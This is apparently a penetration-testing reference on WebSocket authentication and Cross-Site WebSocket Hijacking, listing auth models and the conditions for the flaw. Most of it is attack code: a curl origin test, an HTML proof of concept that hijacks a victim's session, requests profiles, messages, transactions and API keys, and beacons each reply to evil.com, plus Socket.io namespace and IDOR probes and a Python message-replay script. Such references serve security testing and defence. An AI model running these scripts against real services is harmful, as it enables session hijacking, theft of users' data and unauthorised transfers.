# WebSocket Authentication & CSWSH Deep Reference

## WebSocket Authentication Models

### Model 1: Cookie-based (most common, CSWSH-vulnerable)
```
Client → WS Upgrade request with Cookie header (auto-sent by browser)
Server validates cookie → authenticated connection
Problem: Any website can initiate WS to target.com with victim's cookies
```

### Model 2: Token in URL (logged in server access logs)
```
wss://target.com/ws?token=eyJ...
Problem: Token in URL → appears in server logs, browser history, Referer header
```

### Model 3: Token in first message (recommended)
```
Client connects → immediately sends {"type":"auth","token":"eyJ..."}
Server validates token → grants access
Problem: Race condition if server allows actions before auth message received
```

### Model 4: Ticket-based (best practice)
```
Client: GET /api/ws-ticket → receives short-lived one-time ticket
Client: wss://target.com/ws?ticket=one-time-ticket
Server: validates ticket, marks as used
No CSRF risk: ticket requires authenticated HTTP request to obtain
```

## CSWSH Conditions

All three must be true:
1. **Cookie auth**: Server authenticates via session cookie (not token-in-message)
2. **No Origin check**: Server doesn't validate `Origin` header during handshake
3. **Cross-origin WS allowed**: Server accepts connections from any origin

## Testing Origin Validation

```bash
# Using Burp Suite:
# 1. Log in to target.com
# 2. Establish WS connection
# 3. Go to Proxy → WebSockets history
# 4. Find the upgrade request
# 5. Send to Repeater
# 6. Change Origin: header to https://evil.com
# 7. Resend → if 101 Switching Protocols → vulnerable

# Using curl to test WS upgrade:
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=VICTIM-TOKEN" \
  https://target.com/ws
# Look for: HTTP/1.1 101 Switching Protocols
```

## Advanced CSWSH PoC — Data Exfiltration

```html
<!DOCTYPE html>
<html>
<script>
// Steal victim's entire WS session
var ws = new WebSocket("wss://target.com/ws");
var stolen = [];

ws.onmessage = function(e) {
    stolen.push(e.data);
    
    // Real-time exfil via image beacon
    new Image().src = "https://evil.com/steal?d=" + encodeURIComponent(e.data);
    
    // Or fetch (if CORS allows)
    // fetch("https://evil.com/steal", {method:"POST", body: e.data});
};

ws.onopen = function() {
    // Probe all known actions
    [
        '{"action":"get_profile"}',
        '{"action":"get_messages","limit":100}',
        '{"action":"get_transactions"}',
        '{"action":"get_api_keys"}',
        '{"action":"export_data"}',
    ].forEach(msg => ws.send(msg));
    
    // Also try action enumeration
    for(let id=1; id<100; id++) {
        ws.send(JSON.stringify({"action":"get_resource","id":id}));
    }
};

// Keep connection alive
setInterval(() => {
    if(ws.readyState === 1) ws.send('{"action":"ping"}');
}, 30000);
</script>
</html>
```

## Socket.io Namespace Security

```javascript
// Socket.io namespaces are like separate WS endpoints
// Default namespace: /
// Custom: /admin, /internal, /api

// Test if admin namespace requires auth:
const adminSocket = io("https://target.com/admin", {
    // No auth
});
adminSocket.on("connect", () => {
    console.log("[!] Connected to /admin namespace without auth!");
    adminSocket.emit("list_users", {}, (data) => console.log(data));
});
adminSocket.on("connect_error", (e) => {
    console.log("Namespace protected:", e.message);
});

// Socket.io room joining
const socket = io("https://target.com");
socket.emit("join", "admin_room");
socket.emit("join", {room: "admin", user_id: 1});  // IDOR
socket.on("admin_room", (data) => console.log("[!] Admin room data:", data));
```

## Message Replay Attack

```python
import websocket, json, time

# Capture a sensitive message:
# {"type":"transfer","from":1337,"to":9999,"amount":100,"nonce":"abc123"}

# Replay it:
ws = websocket.create_connection(
    "wss://target.com/ws",
    cookie="session=ATTACKER-TOKEN"
)

# Replay someone else's captured message with your session
original_message = '{"type":"transfer","from":1338,"to":9999,"amount":500,"nonce":"xyz789"}'
ws.send(original_message)
print("Replay response:", ws.recv())
ws.close()
```
